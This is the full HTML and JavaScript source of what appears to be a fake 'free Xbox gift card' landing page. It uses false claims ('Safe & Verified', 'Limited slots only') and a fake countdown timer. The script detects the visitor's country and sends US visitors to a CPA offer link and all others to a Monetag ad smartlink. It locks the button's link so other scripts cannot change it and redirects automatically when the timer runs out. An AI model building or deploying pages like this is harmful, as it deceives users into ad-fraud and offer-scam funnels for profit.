    <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>GiftCardZoneEU â€” Claim Your Xbox Gift Card</title>
<meta name="robots" content="noindex,nofollow" />
<style>
  :root { --bg1:#0ea5e9; --bg2:#2563eb; --text:#f8fafc; --muted:#cbd5e1; --accent:#22c55e; }
  *{box-sizing:border-box} body{
    margin:0; font-family:system-ui, Arial, sans-serif; color:var(--text); text-align:center;
    background:linear-gradient(90deg,var(--bg1),var(--bg2)); background-size:200% 200%;
    animation:grad 8s ease-in-out infinite alternate; padding:32px 18px;
  }
  @keyframes grad{0%{background-position:0% 50%}100%{background-position:100% 50%}}
  .card{max-width:680px;margin:0 auto;background:rgba(255,255,255,.06);backdrop-filter:blur(6px);
    border:1px solid rgba(255,255,255,.15); border-radius:18px; padding:22px; box-shadow:0 10px 30px rgba(0,0,0,.25)}
  h1{font-size:24px;margin:6px 0 8px}
  p.lead{margin:0 0 14px;color:var(--muted)}
  .hero{display:block;margin:8px auto 14px; max-width:360px; width:90%; border-radius:12px; box-shadow:0 8px 22px rgba(0,0,0,.35)}
  .timer{font:700 28px/1 monospace; letter-spacing:.5px; margin:8px 0 14px}
  .cta{display:inline-block; padding:12px 18px; border-radius:12px; background:var(--accent); color:#052e16;
       text-decoration:none; font-weight:700; box-shadow:0 6px 18px rgba(0,0,0,.25)}
  .badges{list-style:none; padding:0; margin:14px 0 0; display:grid; gap:6px; justify-content:center}
  .badges li{background:rgba(255,255,255,.08); padding:6px 10px; border-radius:12px; display:inline-block}
  .warn{display:none; margin-top:14px; background:rgba(255,255,255,.12); border:1px dashed rgba(255,255,255,.35);
        padding:12px; border-radius:12px; color:#fff}
  footer{margin-top:18px; color:var(--muted); font-size:13px}
</style>
</head>
<body>
  <main class="card">
    <h1>Claim Your Xbox Gift Card</h1>
    <p class="lead">Limited slots only. Finish the quick check to unlock your reward.</p>

    <!-- Image (also clickable later by CTA only) -->
<!-- Built-in Xbox Gift Card image (no external host needed) -->
<svg class="hero" viewBox="0 0 1200 700" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="grad" x1="0" x2="1" y1="0" y2="1">
      <stop offset="0%" stop-color="#107C10"/>
      <stop offset="100%" stop-color="#3dbb3d"/>
    </linearGradient>
  </defs>
  <rect x="60" y="60" width="1080" height="580" rx="40" fill="url(#grad)" stroke="#1b1b1b" stroke-width="4"/>
  <text x="180" y="300" font-size="90" font-family="Arial Black" fill="white">XBOX</text>
  <text x="180" y="420" font-size="60" font-family="Arial Black" fill="white" opacity="0.9">GIFT CARD</text>
  <text x="180" y="480" font-size="28" font-family="Arial" fill="white" opacity="0.8">Instant Digital Reward</text>
</svg>
    <!-- Timer -->
    <div class="timer"><span id="m">05</span>:<span id="s">00</span></div>

    <!-- CTA (set by script) -->
    <a id="cta" class="cta" href="#">ðŸ‘‰ Claim Now</a>

    <!-- Benefits -->
    <ul class="badges">
      <li>ðŸ“± Android Optimized</li>
      <li>ðŸ”’ Safe & Verified</li>
      <li>âš¡ Instant Access</li>
    </ul>

    <!-- Non-Android notice + fallback link -->
    <div id="warn" class="warn">
      <b>Note:</b> This offer is best on Android.<br>
      If youâ€™re not on Android, use this verified link:
      <a id="fallback" href="#" style="color:#d1fae5;font-weight:700">Open Offer</a>
    </div>

    <footer>Â© <span id="year"></span> GiftCardZoneEU. All rights reserved.</footer>
  </main>72074

  <!-- ===== Single script: config + logic ===== -->
<script defer>
// ================== LINKS ==================
const LINKS = {
  cpa:     "https://singingfiles.com/show.php?l=0&u=180655&id=72074",   // CPA (US)
  monetag: "https://syndication.monetag.com/smartlink?zoneid=4590821"   // Default (non-US)
};

// ================== STATE / DOM HOOKS ==================
const params = new URLSearchParams(location.search);
const forcedMode = params.get("mode"); // optional ?mode=cpa|monetag
let FINAL_URL = LINKS.monetag;

let cta, mEl, sEl, yearEl;

// ------------------ HELPERS ------------------
function applyFinalUrl(url) {
  FINAL_URL = url;
  if (!cta) return;

  cta.setAttribute("href", FINAL_URL);

  // hard-lock click
  if (!cta._lockedClick) {
    cta.addEventListener("click", (e) => {
      e.preventDefault();
      try { window.location.replace(FINAL_URL); }
      catch { window.location.href = FINAL_URL; }
    }, { passive:false });
    cta._lockedClick = true;
  }

  // keep href if other scripts try to change it
  if (!cta._mo) {
    const mo = new MutationObserver(() => {
      if (cta.getAttribute("href") !== FINAL_URL) cta.setAttribute("href", FINAL_URL);
    });
    mo.observe(cta, { attributes:true, attributeFilter:["href"] });
    cta._mo = mo;
  }

  // reassert every 1.5s vs late scripts
  if (!window._ctaReassert) {
    window._ctaReassert = setInterval(() => {
      if (cta.getAttribute("href") !== FINAL_URL) cta.setAttribute("href", FINAL_URL);
    }, 1500);
  }

  console.log("[CTA] locked â†’", FINAL_URL);
}

async function detectCountry() {
  // Cloudflare trace (fast)
  try {
    const txt = await fetch("https://www.cloudflare.com/cdn-cgi/trace", { cache:"no-store" }).then(r=>r.text());
    const m = txt.match(/loc=([A-Z]{2})/);
    if (m && m[1]) return m[1];
  } catch(e){ console.log("[GEO] CF fail", e); }

  // ipapi fallback
  try {
    const j = await fetch("https://ipapi.co/json/", { cache:"no-store" }).then(r=>r.json());
    if (j && j.country) return j.country;
  } catch(e){ console.log("[GEO] ipapi fail", e); }

  return null;
}

function chooseWithGeo(cc) {
  if (forcedMode && LINKS[forcedMode]) return LINKS[forcedMode]; // manual override
  if (cc === "US") return LINKS.cpa;   // US â†’ CPA
  return LINKS.monetag;                // others â†’ Monetag
}

// ------------------ COUNTDOWN ------------------
function startCountdown(seconds) {
  if (!mEl || !sEl) return;
  let t = seconds;

  function render() {
    const min = Math.floor(t / 60);
    const sec = t % 60;
    mEl.textContent = String(min).padStart(2, "0");
    sEl.textContent = String(sec).padStart(2, "0");
  }

  function tick() {
    render();
    if (t > 0) {
      t--;
      setTimeout(tick, 1000);
    } else {
      // time's up â†’ go to final URL
      try { window.location.replace(FINAL_URL); }
      catch { window.location.href = FINAL_URL; }
    }
  }

  tick();
}

// ------------------ INIT AFTER DOM READY ------------------
document.addEventListener("DOMContentLoaded", async () => {
  // DOM refs
  cta    = document.getElementById("cta");
  mEl    = document.getElementById("m");
  sEl    = document.getElementById("s");
  yearEl = document.getElementById("year");
  if (yearEl) yearEl.textContent = new Date().getFullYear();

  if (!cta) { console.warn("[CTA] not found"); return; }

  // default while waiting for GEO
  applyFinalUrl(LINKS.monetag);

  // GEO refine
  const cc = await detectCountry();
  const finalUrl = chooseWithGeo(cc);
  applyFinalUrl(finalUrl);

  // start 5:00 countdown
  startCountdown(5 * 60);

  console.log("[GEO] Country:", cc || "unknown");
  console.log("[CTA] Final redirect:", finalUrl.includes("show.php") ? "CPA" : "Monetag");
});
</script>
